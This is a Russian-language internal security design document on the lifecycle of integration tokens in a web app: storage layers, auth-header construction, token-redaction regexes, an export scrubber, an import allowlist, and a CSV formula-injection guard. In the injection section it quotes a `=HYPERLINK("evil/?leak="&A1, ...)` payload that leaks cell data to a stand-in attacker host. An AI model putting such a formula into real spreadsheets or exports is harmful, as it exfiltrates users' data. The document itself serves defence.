# Auth & Secrets

Как живут токены интеграций на каждом этапе. Что `_scrubSecrets` делает. Как добавить новую интеграцию без token leak.

## Threat model

Что мы защищаем:
1. **Token confidentiality** — токены не должны утекать через UI / logs / экспорты / LLM payloads
2. **Token integrity** — токены не должны случайно стираться через `POST /api/jira/config` с пустым полем
3. **Echo-proxy attacks** — некоторые корп-proxies возвращают `Authorization` header в response body; не должны попасть в наши error logs
4. **CSV formula injection** — `=HYPERLINK(...)` в CSV-cell может exfiltrate данные при открытии в Excel

## Token storage layers

```
┌─────────────────────────────────────────────────────┐
│ Browser                                             │
│                                                     │
│  ┌──────────────────────┐                           │
│  │ UI inputs (settings) │ → password type, never log
│  └──────────┬───────────┘                           │
│             │ saveSettings(patch)                   │
│             ▼                                       │
│  ┌──────────────────────────┐                       │
│  │ localStorage             │                       │
│  │ q2_integrations_v1       │ ← raw tokens          │
│  └──────────┬───────────────┘                       │
│             │                                       │
│             │ POST /api/jira/config (с token field) │
│             ▼                                       │
└─────────────┼───────────────────────────────────────┘
              │
┌─────────────┼───────────────────────────────────────┐
│ Server      ▼                                       │
│  ┌──────────────────────────┐                       │
│  │ jira_config.json         │ ← source of truth     │
│  │ (токены + URLs + keys)   │                       │
│  └──────────┬───────────────┘                       │
│             │ jiraReadConfig() per-request          │
│             ▼                                       │
│  ┌─────────────────────────────────────┐            │
│  │ jiraForward({ headers: {            │            │
│  │   Authorization: makeAuthHeader(   │            │
│  │     cfg.jiraToken)                  │            │
│  │ }})                                 │            │
│  └─────────────┬───────────────────────┘            │
└────────────────┼────────────────────────────────────┘
                 │
                 ▼
              (Jira / BB / CF)
```

**Ключевое правило:** Token **никогда** не возвращается обратно в browser. `GET /api/jira/config` отдаёт `{hasJiraToken: bool}`, не сам токен.

## Token-flow в деталях

### 1. UI → localStorage

```js
// views/integrationsView.js#int-cf-save (V17.2 I3 pattern)
const tok = modal.querySelector('#int-cf-token')?.value?.trim();
const patch = { /* ... */ };
if (tok) patch.confluenceToken = tok;        // ← non-empty guard
saveSettings(patch);                          // → localStorage
```

**Empty token field = preserve existing.** Если поле пустое, мы НЕ отправляем `confluenceToken: ''` — иначе вытерли бы существующий токен. Этот guard есть в `saveSettings` (whitelist) и в server-side handler.

### 2. localStorage → server

```js
// V17.2 I3 — postServerConfig with await + ok-check
const r = await postServerConfig({ confluenceToken: tok, /* ... */ });
if (r.ok) {
  showToast('✓ Сохранено');
} else {
  showToast(`Не удалось: ${r.error || 'HTTP ' + r.status}`);
}
```

До V17.2 I3 это было `fetch().catch(()=>{})` — fire-and-forget, fake-success при network error. Сейчас `await` обязателен.

### 3. Server-side persistence

```js
// server.js POST /api/jira/config
if (typeof body.confluenceToken === 'string' && body.confluenceToken) {
  patch.confluenceToken = body.confluenceToken;
}
// pустой → НЕ пишется → существующий сохраняется
```

`jira_config.json` обновляется атомарно (`fs.writeFileSync`).

### 4. Outgoing request

```js
// server.js _ppMakeAuthHeader
function _ppMakeAuthHeader(token) {
  if (!token) return '';
  if (/^Bearer /i.test(token)) return token;          // уже Bearer
  if (token.includes(':')) return `Basic ${Buffer.from(token).toString('base64')}`;
  return `Bearer ${token}`;
}
```

Поддержка форматов:
- `Bearer eyJh...` → as-is
- `email:apiToken` (Jira Cloud Basic auth) → `Basic <base64>`
- `pat-...` или сырой token → `Bearer <token>`

### 5. Response handling

Important: **response body может содержать echo'ed Authorization header** на некоторых корп-proxies. Token-redact regex применяется перед throw:

```js
// integrations/employeePerformance.js (V17.2 I4a)
if (!res.ok) {
  const txt = await res.text();
  const safe = String(txt).slice(0, 200)
    .replace(/Bearer\s+[A-Za-z0-9\-_=.]+/gi, 'Bearer ***')
    .replace(/(Authorization|X-API-Key)\s*[:=]\s*[^\s,;]+/gi, '$1: ***')
    .replace(/(token|secret|password|apiKey|authKey)\s*[:=]\s*[^\s,;"]+/gi, '$1: ***');
  throw new Error(`HTTP ${res.status}: ${safe}`);
}
```

Этот pattern должен быть в **каждом** error-bubbling-path который пишет в `ErrorsLog.add()` или показывает текст user-у.

## `_scrubSecrets` policy

**Все** export-paths ОБЯЗАНЫ проходить через scrubber:

```js
// dataStore.js
const _SECRET_FIELD_NAMES = [
  'token', 'jiratoken', 'bitbuckettoken', 'confluencetoken', 'sigmatoken',
  'gigachatauthkey', 'authkey', 'apikey', 'password', 'secret', 'bearer',
];
function _scrubSecrets(obj) {
  if (!obj || typeof obj !== 'object') return obj;
  if (Array.isArray(obj)) return obj.map(v => _scrubSecrets(v));
  const out = {};
  for (const [k, v] of Object.entries(obj)) {
    if (_SECRET_FIELD_NAMES.some(s => k.toLowerCase().includes(s))) continue;
    out[k] = (v && typeof v === 'object') ? _scrubSecrets(v) : v;
  }
  return out;
}
```

Применяется в:
- `CSV._buildSettingsBundle()` — для CSV export
- `JSONExport.buildSnapshot()` — для JSON export (V17.1 F1)

Любой новый export-path должен **сам** вызвать scrubber или попасть в один из существующих.

### Тест на token leak

`tests/unit/v17AuditFixes.test.js` имеет:

```js
test('CSV export bundle includes q2_integrations_v1 BUT tokens are scrubbed', () => {
  localStorage.setItem('q2_integrations_v1', JSON.stringify({
    jiraToken: 'AAAA-SECRET',
    jiraProjectKeys: 'PROJ',
  }));
  const bundle = CSV._buildSettingsBundle();
  const integrations = bundle.localStorage.q2_integrations_v1;
  assert.equal(integrations.jiraToken, undefined);
  assert.equal(integrations.jiraProjectKeys, 'PROJ');
  const stringified = JSON.stringify(bundle);
  assert.ok(!stringified.includes('AAAA-SECRET'));
});
```

При добавлении нового token-поля → добавь analogous-тест.

## Allowlist на import

`dataStore.js` `JSON_ALLOWED_BUNDLE_KEYS` ограничивает что import может писать в localStorage:

```js
const JSON_ALLOWED_BUNDLE_KEYS = new Set([
  'q2_plan_v3', 'q2_plan_v2', 'q2_plan',
  'q2_settings_v3', 'q2_settings_v2', 'q2_settings',
  'q2_llm_settings_v1',
  'q2_integrations_v1',           // V17.1 F1 — добавлен
  'q2_onboarding_v1',
  'sbof_app_settings_v1',
  'welcomeShown',
  'dataStorageMode',
  'q2_action_log_v1',
]);
```

Что вне списка — игнорируется (ловушка для `__proto__` polution / неизвестных ключей с потенциальным CSRF surface).

Token при import уже scrubbed на export-стороне → integrations с пустыми token-полями восстанавливаются, юзер заново вводит токены.

## CSV formula injection guard

`utils.js` `escapeCSV` префиксует zero-width space (ZWSP `​`) для значений начинающихся с `= + - @ \t \r`:

```js
escapeCSV(v) {
  let s = String(v ?? '');
  if (s && /^[=+\-@\t\r]/.test(s)) s = '​' + s;       // V17 P9 F1
  if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}
```

История: до V17 P9 F1 значение `=HYPERLINK("evil/?leak="&A1, "ok")` в Реестре открывалось в Excel как живая формула → exfiltrate.

При добавлении нового CSV-export — ОБЯЗАТЕЛЬНО используй `Utils.escapeCSV` per-cell.

## Как добавить новую интеграцию

Шаги в порядке security-checklist:

1. **Frontend UI**: input `type="password"`. ID `int-<name>-token`.
2. **Save handler** (в `views/integrationsView.js`):
   - `tok` читается с `.value?.trim()`
   - empty-token guard: `if (tok) patch.<name>Token = tok;`
   - empty-URL guard: `if (url) patch.<name>BaseUrl = url;` (V17.2 I3)
   - `await postServerConfig(...)` + check `r.ok` (V17.2 I3)
3. **Server config**:
   - whitelist string-полей в `JIRA_DEFAULT_CONFIG`
   - в `POST /api/jira/config` whitelist'е добавить `<name>BaseUrl`, `<name>ProjectKeys`
   - token persistence: `if (typeof body.<name>Token === 'string' && body.<name>Token)` — non-empty guard
   - `jiraSanitizeConfig` — `has<name>Token: !!cfg.<name>Token` (НЕ возвращай сам токен)
4. **Outgoing request**:
   - `Authorization: _ppMakeAuthHeader(cfg.<name>Token)`
   - `Accept: application/json` (V17.2 I2a — некоторые серверы за SSO без него возвращают HTML)
   - Path-cascade если Cloud/DC различаются
5. **Error handling**:
   - 401/403 → специальное сообщение «токен просрочен или нет прав»
   - Token-redact regex перед throw / ErrorsLog.add
6. **Export safety**:
   - Если token-поле имеет нестандартное имя (например, `<name>Bearer` вместо `<name>Token`) — добавь в `_SECRET_FIELD_NAMES`
   - Тест на token leak в `v17AuditFixes.test.js`
7. **localStorage allowlist**:
   - Если интеграция использует свой ключ (например, `q2_<name>_v1`) — добавь в `JSON_ALLOWED_BUNDLE_KEYS`
   - Иначе храни в общем `q2_integrations_v1`
8. **Identity** (если данные привязываются к сотрудникам):
   - Добавь поле в `EmployeeFactory.create` + `normalize`
   - Расширь UI карточки сотрудника (`views/employees.js#_buildIdInput`)
   - Расширь `analysePulse(opts)` логику attribution
   - **НЕ** делай fuzzy-name match — только email/explicit-id

## Контрольный чек-лист безопасности

Перед merging нового integration code:

- [ ] Token не возвращается из server-side в frontend (только `has<X>Token: bool`)
- [ ] Empty token field в UI = preserve existing на сервере
- [ ] Empty URL field в UI = preserve existing на сервере (V17.2 I3)
- [ ] All requests через `_ppMakeAuthHeader` (никаких inline `Bearer ${token}`)
- [ ] Error paths имеют token-redact regex
- [ ] Export bundle использует `_scrubSecrets` (или попадает в существующий который использует)
- [ ] Test «token leak» добавлен
- [ ] CSV-export-cells через `Utils.escapeCSV`
- [ ] Identity-поле в `state.employees[]` (если применимо), не fuzzy-name
- [ ] localStorage migration / allowlist если новый ключ

## Audit-источники

- `audit-2026-05-V17/01-tech-audit.md` § «Critical» — изначальный token-leak audit (CRIT-1)
- `audit-2026-05-V17/13-integrations-audit.md` — V17.2 целиком (I1-I5 + I2c)
